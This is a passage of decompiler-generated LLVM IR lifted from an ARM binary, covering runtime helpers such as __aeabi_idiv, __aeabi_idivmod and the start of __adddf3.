  %v7_1ebf0 = load i32, i32* %r8.global-to-local, align 4
  %v9_1ebf0 = add i32 %v7_1ebf0, %v8_1ebf0
  %v10_1ebf0 = inttoptr i32 %v9_1ebf0 to i8*
  store i8 0, i8* %v10_1ebf0, align 1
  %v0_1ebf4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1ebf4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebf4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1ebe4, %bb
  %v2_1ebf4 = phi i1 [ %v2_1ebf4.pre, %bb ], [ false, %dec_label_pc_1ebe4 ]
  %v1_1ebf4 = phi i1 [ %v1_1ebf4.pre, %bb ], [ %v1_1ebe4, %dec_label_pc_1ebe4 ]
  %v0_1ebf4 = phi i1 [ %v0_1ebf4.pre, %bb ], [ %v2_1ebe4, %dec_label_pc_1ebe4 ]
  %v3_1ebf4 = xor i1 %v2_1ebf4, %v1_1ebf4
  %v4_1ebf4 = or i1 %v0_1ebf4, %v3_1ebf4
  br i1 %v4_1ebf4, label %dec_label_pc_1ebf8, label %.dec_label_pc_1ebfc_crit_edge

.dec_label_pc_1ebfc_crit_edge:                    ; preds = %bb22
  %v1_1ec00.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1ebfc

dec_label_pc_1ebf8:                               ; preds = %dec_label_pc_1ebb0, %dec_label_pc_1eb8c, %bb22
  br label %dec_label_pc_1ebfc

dec_label_pc_1ebfc:                               ; preds = %.dec_label_pc_1ebfc_crit_edge, %dec_label_pc_1ebf8
  %v1_1ec00 = phi i32 [ %v1_1ec00.pre, %.dec_label_pc_1ebfc_crit_edge ], [ -1, %dec_label_pc_1ebf8 ]
  %v2_1ebfc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1ebfc, i32* @r4, align 4
  store i32 %v6_1eb58, i32* @r5, align 4
  store i32 %v9_1eb58, i32* @r6, align 4
  ret i32 %v1_1ec00

; uselistorder directives
  uselistorder i32 %v0_1ebe4, { 0, 2, 1 }
  uselistorder i32 %v0_1ebcc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1ebc0, { 1, 0 }
  uselistorder i32 %v2_1ebb0, { 1, 0 }
  uselistorder i32 %v1_1eba4, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1ebb8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1eb88, { 1, 0 }
  uselistorder i1 %v2_1ebcc24, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i8 0, { 8, 47, 48, 1, 2, 50, 49, 51, 3, 52, 30, 53, 10, 11, 54, 4, 55, 56, 58, 57, 33, 59, 34, 12, 61, 60, 13, 14, 15, 16, 17, 63, 62, 35, 64, 5, 65, 66, 9, 67, 31, 32, 69, 70, 68, 71, 73, 72, 36, 74, 18, 75, 76, 77, 19, 78, 6, 79, 45, 20, 21, 22, 23, 24, 25, 80, 81, 82, 83, 84, 37, 86, 87, 88, 89, 85, 26, 27, 0, 90, 91, 92, 28, 94, 93, 29, 95, 96, 97, 38, 98, 99, 7, 101, 39, 102, 103, 100, 104, 105, 106, 107, 109, 108, 110, 113, 111, 112, 114, 117, 115, 116, 118, 134, 135, 131, 132, 133, 129, 130, 127, 128, 125, 126, 123, 124, 120, 121, 122, 119, 136, 137, 138, 139, 140, 141, 143, 142, 145, 144, 146, 40, 148, 147, 46, 149, 41, 150, 152, 153, 151, 42, 154, 155, 44, 156, 43, 157, 158, 159, 160, 161, 162 }
  uselistorder i32 ()* @memcpy, { 19, 18, 17, 12, 11, 10, 9, 8, 7, 25, 16, 15, 6, 14, 5, 4, 0, 3, 2, 1, 13, 24, 23, 22, 21, 20 }
  uselistorder i32 (i8*)* @strlen, { 15, 13, 12, 11, 10, 9, 28, 27, 14, 8, 7, 6, 29, 26, 25, 24, 22, 23, 21, 20, 19, 18, 32, 31, 30, 17, 16, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 11, 7, 6, 5, 2, 1, 0, 10, 9, 8, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 4, 3 }
  uselistorder i32 46, { 0, 1, 5, 6, 7, 8, 9, 4, 2, 3 }
  uselistorder label %dec_label_pc_1ebfc, { 1, 0 }
  uselistorder label %dec_label_pc_1ebf8, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1ebe4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1ebd8, { 1, 0 }
  uselistorder label %dec_label_pc_1eb8c, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1ec04 = load i32, i32* @r1, align 4
  %v1_1ec04 = icmp slt i32 %v0_1ec04, 0
  %v2_1ec04 = icmp eq i32 %v0_1ec04, 0
  %v2_1ec08 = xor i32 %v0_1ec04, %arg1
  br i1 %v2_1ec04, label %dec_label_pc_1ed1c, label %dec_label_pc_1ec10

dec_label_pc_1ec10:                               ; preds = %entry
  br i1 %v1_1ec04, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1ec10
  %v2_1ec10 = sub i32 0, %v0_1ec04
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1ec10, %bb
  %v1_1ecdc = phi i32 [ %v2_1ec10, %bb ], [ %v0_1ec04, %dec_label_pc_1ec10 ]
  %v1_1ec14 = add i32 %v1_1ecdc, -1
  %v7_1ec14 = icmp eq i32 %v1_1ecdc, 1
  br i1 %v7_1ec14, label %dec_label_pc_1ecbc, label %dec_label_pc_1ec1c

dec_label_pc_1ec1c:                               ; preds = %thread-pre-split
  %v1_1ec1c = icmp slt i32 %arg1, 0
  br i1 %v1_1ec1c, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1ec1c
  %v2_1ec20 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1ec1c, %bb85
  %v0_1ed10 = phi i32 [ %arg1, %dec_label_pc_1ec1c ], [ %v2_1ec20, %bb85 ]
  %v3_1ec24 = icmp uge i32 %v0_1ed10, %v1_1ecdc
  %v9_1ec24 = icmp eq i32 %v0_1ed10, %v1_1ecdc
  %v2_1ec28 = xor i1 %v3_1ec24, true
  %v3_1ec28 = or i1 %v9_1ec24, %v2_1ec28
  br i1 %v3_1ec28, label %dec_label_pc_1ecc8, label %dec_label_pc_1ec2c

dec_label_pc_1ec2c:                               ; preds = %bb86
  %v2_1ec2c = and i32 %v1_1ec14, %v1_1ecdc
  %v4_1ec2c = icmp eq i32 %v2_1ec2c, 0
  br i1 %v4_1ec2c, label %dec_label_pc_1ecd8, label %dec_label_pc_1ec34

dec_label_pc_1ec34:                               ; preds = %dec_label_pc_1ec2c
  %v3_1ec34 = icmp ult i32 %v1_1ecdc, 536870912
  br i1 %v3_1ec34, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1ec34
  %v4_1ec38 = mul i32 %v1_1ecdc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1ec34, %.thread
  %v0_1ec58.pr40.ph = phi i32 [ %v4_1ec38, %.thread ], [ %v1_1ecdc, %dec_label_pc_1ec34 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1ec34 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1ec58.pr40 = phi i32 [ %v4_1ec4c, %bb89 ], [ %v0_1ec58.pr40.ph, %.preheader.preheader ]
  %v1_1ec50 = phi i32 [ %v4_1ec50, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1ec44 = icmp ugt i32 %v0_1ec58.pr40, 268435455
  br i1 %v2_1ec44, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1ec58thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1ec48 = icmp ult i32 %v0_1ec58.pr40, %v0_1ed10
  br i1 %v4_1ec48, label %bb88, label %dec_label_pc_1ec58thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1ec4c = and i32 %v0_1ec58.pr40, 268435456
  %v3_1ec4c = icmp eq i32 %v2_1ec4c, 0
  %v4_1ec4c = mul i32 %v0_1ec58.pr40, 16
  br i1 %v3_1ec4c, label %bb89, label %dec_label_pc_1ec58.loopexit

bb89:                                             ; preds = %bb88
  %v2_1ec50 = and i32 %v1_1ec50, 268435456
  %v3_1ec50 = icmp eq i32 %v2_1ec50, 0
  %v4_1ec50 = mul i32 %v1_1ec50, 16
  br i1 %v3_1ec50, label %.preheader, label %dec_label_pc_1ec58thread-pre-split.loopexit.loopexit

dec_label_pc_1ec58thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1ec6452.ph = phi i32 [ %v1_1ec50, %bb87 ], [ %v4_1ec50, %bb89 ]
  %v0_1ec58.pr42.ph = phi i32 [ %v0_1ec58.pr40, %bb87 ], [ %v4_1ec4c, %bb89 ]
  br label %dec_label_pc_1ec58thread-pre-split.loopexit

dec_label_pc_1ec58thread-pre-split.loopexit:      ; preds = %dec_label_pc_1ec58thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1ec6452 = phi i32 [ %v1_1ec50, %.thread3 ], [ %v1_1ec6452.ph, %dec_label_pc_1ec58thread-pre-split.loopexit.loopexit ]
  %v0_1ec58.pr42 = phi i32 [ %v0_1ec58.pr40, %.thread3 ], [ %v0_1ec58.pr42.ph, %dec_label_pc_1ec58thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1ec58thread-pre-split

dec_label_pc_1ec58thread-pre-split:               ; preds = %dec_label_pc_1ec58thread-pre-split.loopexit, %bb91
  %v1_1ec6450 = phi i32 [ %v1_1ec6452, %dec_label_pc_1ec58thread-pre-split.loopexit ], [ %v3_1ec64, %bb91 ]
  %v2_1ec5c48 = phi i32 [ %v0_1ed10, %dec_label_pc_1ec58thread-pre-split.loopexit ], [ %v2_1ec5c, %bb91 ]
  %v0_1ec58.pr = phi i32 [ %v0_1ec58.pr42, %dec_label_pc_1ec58thread-pre-split.loopexit ], [ %v3_1ec60, %bb91 ]
  br label %dec_label_pc_1ec58

dec_label_pc_1ec58.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1ec58

dec_label_pc_1ec58:                               ; preds = %dec_label_pc_1ec58.loopexit, %dec_label_pc_1ec58thread-pre-split
  %v1_1ec64 = phi i32 [ %v1_1ec6450, %dec_label_pc_1ec58thread-pre-split ], [ %v1_1ec50, %dec_label_pc_1ec58.loopexit ]
  %v2_1ec5c = phi i32 [ %v2_1ec5c48, %dec_label_pc_1ec58thread-pre-split ], [ %v0_1ed10, %dec_label_pc_1ec58.loopexit ]
  %v1_1ec60 = phi i32 [ %v0_1ec58.pr, %dec_label_pc_1ec58thread-pre-split ], [ %v4_1ec4c, %dec_label_pc_1ec58.loopexit ]
  %v2_1ec58 = icmp slt i32 %v1_1ec60, 0
  br i1 %v2_1ec58, label %dec_label_pc_1ec6c, label %bb90

bb90:                                             ; preds = %dec_label_pc_1ec58
  %v4_1ec5c = icmp ult i32 %v1_1ec60, %v2_1ec5c
  br i1 %v4_1ec5c, label %bb91, label %dec_label_pc_1ec6c

bb91:                                             ; preds = %bb90
  %v3_1ec60 = mul i32 %v1_1ec60, 2
  %v2_1ec64 = icmp slt i32 %v1_1ec64, 0
  %v3_1ec64 = mul i32 %v1_1ec64, 2
  br i1 %v2_1ec64, label %dec_label_pc_1ec6c, label %dec_label_pc_1ec58thread-pre-split

dec_label_pc_1ec6c:                               ; preds = %bb90, %dec_label_pc_1ec58, %bb91
  %v2_1ec7863 = phi i32 [ %v3_1ec64, %bb91 ], [ %v1_1ec64, %bb90 ], [ %v1_1ec64, %dec_label_pc_1ec58 ]
  %v1_1ec7055 = phi i32 [ %v3_1ec60, %bb91 ], [ %v1_1ec60, %bb90 ], [ %v1_1ec60, %dec_label_pc_1ec58 ]
  br label %dec_label_pc_1ec70

dec_label_pc_1ec70:                               ; preds = %.thread13, %dec_label_pc_1ec6c
  %v1_1eca4 = phi i32 [ %v4_1eca4, %.thread13 ], [ %v2_1ec7863, %dec_label_pc_1ec6c ]
  %v1_1ec78 = phi i32 [ %v1_1ecb4, %.thread13 ], [ 0, %dec_label_pc_1ec6c ]
  %v1_1eca8 = phi i32 [ %v4_1eca8, %.thread13 ], [ %v1_1ec7055, %dec_label_pc_1ec6c ]
  %v1_1ec74 = phi i32 [ %v0_1eca0, %.thread13 ], [ %v0_1ed10, %dec_label_pc_1ec6c ]
  %v3_1ec70 = icmp ult i32 %v1_1ec74, %v1_1eca8
  br i1 %v3_1ec70, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1ec70
  %v3_1ec74 = sub i32 %v1_1ec74, %v1_1eca8
  %v3_1ec78 = or i32 %v1_1ec78, %v1_1eca4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1ec70, %bb92
  %v1_1ec80 = phi i32 [ %v1_1ec74, %dec_label_pc_1ec70 ], [ %v3_1ec74, %bb92 ]
  %v1_1ec84 = phi i32 [ %v1_1ec78, %dec_label_pc_1ec70 ], [ %v3_1ec78, %bb92 ]
  %v4_1ec7c = udiv i32 %v1_1eca8, 2
  %v6_1ec7c = icmp ult i32 %v1_1ec80, %v4_1ec7c
  br i1 %v6_1ec7c, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1ec80 = urem i32 %v1_1eca8, 2
  %v4_1ec80 = icmp eq i32 %v3_1ec80, 0
  %v6_1ec80 = sub i32 %v1_1ec80, %v4_1ec7c
  br i1 %v4_1ec80, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1ec84 = udiv i32 %v1_1eca4, 2
  %v6_1ec84 = or i32 %v1_1ec84, %v5_1ec84
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1ec8c = phi i32 [ %v6_1ec80, %bb93 ], [ %v1_1ec80, %.thread8 ], [ %v6_1ec80, %bb94 ]
  %v1_1ec90 = phi i32 [ %v1_1ec84, %bb93 ], [ %v1_1ec84, %.thread8 ], [ %v6_1ec84, %bb94 ]
  %v4_1ec88 = udiv i32 %v1_1eca8, 4
  %v6_1ec88 = icmp ult i32 %v1_1ec8c, %v4_1ec88
  br i1 %v6_1ec88, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1ec8c = and i32 %v1_1eca8, 2
  %v4_1ec8c = icmp eq i32 %v3_1ec8c, 0
  %v6_1ec8c = sub i32 %v1_1ec8c, %v4_1ec88
  br i1 %v4_1ec8c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1ec90 = udiv i32 %v1_1eca4, 4
  %v6_1ec90 = or i32 %v1_1ec90, %v5_1ec90
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1ec98 = phi i32 [ %v6_1ec8c, %bb95 ], [ %v1_1ec8c, %.thread9 ], [ %v6_1ec8c, %bb96 ]
  %v1_1ec9c = phi i32 [ %v1_1ec90, %bb95 ], [ %v1_1ec90, %.thread9 ], [ %v6_1ec90, %bb96 ]
  %v4_1ec94 = udiv i32 %v1_1eca8, 8
  %v6_1ec94 = icmp ult i32 %v1_1ec98, %v4_1ec94
  br i1 %v6_1ec94, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1ec98 = and i32 %v1_1eca8, 4
  %v4_1ec98 = icmp eq i32 %v3_1ec98, 0
  %v6_1ec98 = sub i32 %v1_1ec98, %v4_1ec94
  br i1 %v4_1ec98, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1ec9c = udiv i32 %v1_1eca4, 8
  %v6_1ec9c = or i32 %v1_1ec9c, %v5_1ec9c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1ecb4 = phi i32 [ %v1_1ec9c, %bb97 ], [ %v1_1ec9c, %.thread10 ], [ %v6_1ec9c, %bb98 ]
  %v0_1eca0 = phi i32 [ %v6_1ec98, %bb97 ], [ %v1_1ec98, %.thread10 ], [ %v6_1ec98, %bb98 ]
  %v2_1eca0 = icmp eq i32 %v0_1eca0, 0
  br i1 %v2_1eca0, label %dec_label_pc_1ecb0, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1eca4, 16
  br i1 %tmp, label %dec_label_pc_1ecb0, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1eca4 = udiv i32 %v1_1eca4, 16
  %v4_1eca8 = udiv i32 %v1_1eca8, 16
  br label %dec_label_pc_1ec70

dec_label_pc_1ecb0:                               ; preds = %thread-pre-split12, %bb99
  %v1_1ecb0 = icmp slt i32 %v2_1ec08, 0
  br i1 %v1_1ecb0, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1ecb0
  %v2_1ecb4 = sub i32 0, %v1_1ecb4
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1ecbc, %dec_label_pc_1ecb0, %bb100
  %v1_1ecb8 = phi i32 [ %v1_1ecb4, %dec_label_pc_1ecb0 ], [ %v2_1ecb4, %bb100 ], [ %arg1, %dec_label_pc_1ecbc ], [ %v2_1ecc0, %bb101 ], [ %v1_1ecd480, %bb103 ], [ %v2_1ecd0, %bb104 ]
  ret i32 %v1_1ecb8

dec_label_pc_1ecbc:                               ; preds = %thread-pre-split
  br i1 %v1_1ec04, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1ecbc
  %v2_1ecc0 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1ecc8:                               ; preds = %bb86
  br i1 %v3_1ec24, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1ecc8
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1ecc8, %bb102
  %v1_1ecd480 = phi i32 [ %arg1, %dec_label_pc_1ecc8 ], [ 0, %bb102 ]
  br i1 %v9_1ec24, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1eccc = ashr i32 %v2_1ec08, 31
  %v2_1ecd0 = or i32 %v4_1eccc, 1
  br label %.thread16

dec_label_pc_1ecd8:                               ; preds = %dec_label_pc_1ec2c
  %v2_1ecd8 = icmp ugt i32 %v1_1ecdc, 65535
  br i1 %v2_1ecd8, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1ecd8
  %v2_1ecdc = and i32 %v1_1ecdc, 32768
  %v3_1ecdc = icmp eq i32 %v2_1ecdc, 0
  %v4_1ecdc = udiv i32 %v1_1ecdc, 65536
  br i1 %v3_1ecdc, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1ecd8
  %v0_1ece870 = phi i32 [ %v1_1ecdc, %dec_label_pc_1ecd8 ], [ %v4_1ecdc, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1ecec = phi i32 [ %v0_1ece870, %.thread19 ], [ %v4_1ecdc, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1ece8 = icmp ugt i32 %v1_1ecec, 255
  br i1 %v2_1ece8, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1ecec = and i32 %v1_1ecec, 128
  %v3_1ecec = icmp eq i32 %v2_1ecec, 0
  %v4_1ecec = udiv i32 %v1_1ecec, 256
  br i1 %v3_1ecec, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1ecf0 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1ecfc = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1ecf0, %bb108 ]
  %v1_1ecf8 = phi i32 [ %v1_1ecec, %bb106 ], [ %v4_1ecec, %bb107 ], [ %v4_1ecec, %bb108 ]
  %v2_1ecf4 = icmp ugt i32 %v1_1ecf8, 15
  br i1 %v2_1ecf4, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1ecf8 = and i32 %v1_1ecf8, 8
  %v3_1ecf8 = icmp eq i32 %v2_1ecf8, 0
  %v4_1ecf8 = udiv i32 %v1_1ecf8, 16
  br i1 %v3_1ecf8, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1ecfc = add nsw i32 %v1_1ecfc, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1ed04 = phi i32 [ %v1_1ecfc, %.thread20 ], [ %v1_1ecfc, %bb109 ], [ %v2_1ecfc, %bb110 ]
  %v5_1ed08 = phi i32 [ %v1_1ecf8, %.thread20 ], [ %v4_1ecf8, %bb109 ], [ %v4_1ecf8, %bb110 ]
  %v2_1ed00 = icmp ugt i32 %v5_1ed08, 3
  %v7_1ed00 = icmp eq i32 %v5_1ed08, 4
  %v2_1ed04 = xor i1 %v7_1ed00, true
  %v3_1ed04 = and i1 %v2_1ed00, %v2_1ed04
  br i1 %v3_1ed04, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1ed04 = add nsw i32 %v4_1ed04, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1ed08 = phi i32 [ %v4_1ed04, %.thread21 ], [ %v5_1ed04, %bb111 ]
  %v2_1ed08 = xor i1 %v2_1ed00, true
  %v3_1ed08 = or i1 %v7_1ed00, %v2_1ed08
  br i1 %v3_1ed08, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1ed08 = udiv i32 %v5_1ed08, 2
  %v9_1ed08 = add i32 %v4_1ed08, %v8_1ed08
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1ed10 = phi i32 [ %v4_1ed08, %bb112 ], [ %v9_1ed08, %bb113 ]
  %v1_1ed0c = icmp slt i32 %v2_1ec08, 0
  %v6_1ed10 = lshr i32 %v0_1ed10, %v1_1ed10
  %v2_1ed14 = sub i32 0, %v6_1ed10
  %v2_1ed14.v6_1ed10 = select i1 %v1_1ed0c, i32 %v2_1ed14, i32 %v6_1ed10
  ret i32 %v2_1ed14.v6_1ed10

dec_label_pc_1ed1c:                               ; preds = %entry
  %v0_1ed20 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1ed08, { 1, 0 }
  uselistorder i1 %v7_1ed00, { 1, 0 }
  uselistorder i32 %v4_1ecf8, { 1, 0 }
  uselistorder i32 %v1_1ecf8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1ecec, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1ecec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1ecdc, { 1, 0 }
  uselistorder i32 %v0_1eca0, { 1, 0 }
  uselistorder i32 %v4_1ec94, { 1, 0 }
  uselistorder i32 %v1_1ec9c, { 1, 2, 0 }
  uselistorder i32 %v4_1ec88, { 1, 0 }
  uselistorder i32 %v1_1ec90, { 1, 2, 0 }
  uselistorder i32 %v4_1ec7c, { 1, 0 }
  uselistorder i32 %v1_1ec84, { 1, 2, 0 }
  uselistorder i32 %v1_1eca8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1ec78, { 1, 0 }
  uselistorder i32 %v1_1eca4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1ec64, { 1, 0 }
  uselistorder i32 %v3_1ec60, { 1, 0 }
  uselistorder i32 %v1_1ec60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1ec5c, { 1, 0 }
  uselistorder i32 %v1_1ec64, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1ec50, { 1, 0 }
  uselistorder i32 %v4_1ec4c, { 2, 1, 0 }
  uselistorder i32 %v1_1ec50, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1ec58.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1ec24, { 1, 0 }
  uselistorder i32 %v1_1ecdc, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1ec08, { 1, 0, 2 }
  uselistorder i32 %v0_1ec04, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1ecb0, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1ec6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ec58thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1ed34 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1ed34
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1ed4c = bitcast i64 %tmp to double
  %v9_1ed4c = fadd double %v8_1ed4c, %arg1
  %v10_1ed4c = fptrunc double %v9_1ed4c to float
  %v11_1ed4c = bitcast float %v10_1ed4c to i32
  ret i32 %v11_1ed4c
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1ed50 = load i32, i32* @r0, align 4
  ret i32 %v2_1ed50
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1ed54 = load i32, i32* @r4, align 4
  store i32 %v3_1ed54, i32* %stack_var_-12, align 4
  %v6_1ed54 = load i32, i32* @r5, align 4
  %v9_1ed54 = load i32, i32* @lr, align 4
  %v0_1ed58 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ed58 = mul i32 %v0_1ed58, 2
  store i32 %v2_1ed58, i32* %r4.global-to-local, align 4
  %v0_1ed5c = load i32, i32* %r3.global-to-local, align 4
  %v2_1ed5c = mul i32 %v0_1ed5c, 2
  store i32 %v2_1ed5c, i32* %r5.global-to-local, align 4
  %v4_1ed60 = icmp eq i32 %v2_1ed5c, %v2_1ed58
  %v1_1ed64 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1ed60, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1ed64 = load i32, i32* %r2.global-to-local, align 4
  %v5_1ed64 = icmp eq i32 %v2_1ed64, %v1_1ed64
  br i1 %v5_1ed64, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1ed68 = or i32 %v1_1ed64, %v2_1ed58
  %v5_1ed68 = icmp eq i32 %v3_1ed68, 0
  br i1 %v5_1ed68, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1ed6c = load i32, i32* %r2.global-to-local, align 4
  %v3_1ed6c = or i32 %v2_1ed6c, %v2_1ed5c
  %v5_1ed6c = icmp eq i32 %v3_1ed6c, 0
  br i1 %v5_1ed6c, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1ed58.off = add i32 %v2_1ed58, 4194303
  %tmp = icmp ult i32 %v2_1ed58.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1ed5c.off = add i32 %v2_1ed5c, 4194303
  %tmp17 = icmp ult i32 %v2_1ed5c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1ed78 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1ed78, i32 ptrtoint (i32* @global_var_1efb0.1279 to i32))
  %v0_1ed7c = load i32, i32* %r4.global-to-local, align 4
  %v3_1ed7c = udiv i32 %v0_1ed7c, 2097152
  store i32 %v3_1ed7c, i32* %r4.global-to-local, align 4
